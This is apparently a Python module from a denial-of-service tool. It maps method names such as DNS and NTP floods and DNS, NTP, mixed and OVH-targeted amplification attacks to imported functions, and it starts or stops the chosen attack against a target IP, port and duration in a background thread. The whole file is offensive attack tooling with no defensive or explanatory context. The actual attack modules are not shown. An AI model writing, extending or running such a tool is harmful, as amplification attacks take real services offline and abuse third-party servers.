import threading
from methods import dns, ntp, amp_dns, amp_ntp, amp_mix, amp_ovh

attack_thread = None
stop_event = threading.Event()

def start_attack(method, ip, port, duration, on_finish=None):
    global attack_thread, stop_event
    stop_event.clear()

    method_map = {
        "dns": dns.run,
        "ntp": ntp.run,
        "dns-amp": amp_dns.run,
        "ntp-amp": amp_ntp.run,
        "mix-amp": amp_mix.run,
        "ovh-amp": amp_ovh.run,
    }

    def run_with_callback():
        method_map[method](ip, port, duration, stop_event)
        if not stop_event.is_set() and on_finish:
            on_finish()

    if method in method_map:
        attack_thread = threading.Thread(target=run_with_callback)
        attack_thread.start()

def stop_attack():
    global stop_event, attack_thread
    stop_event.set()
    if attack_thread:
        attack_thread.join()
        attack_thread = None
  
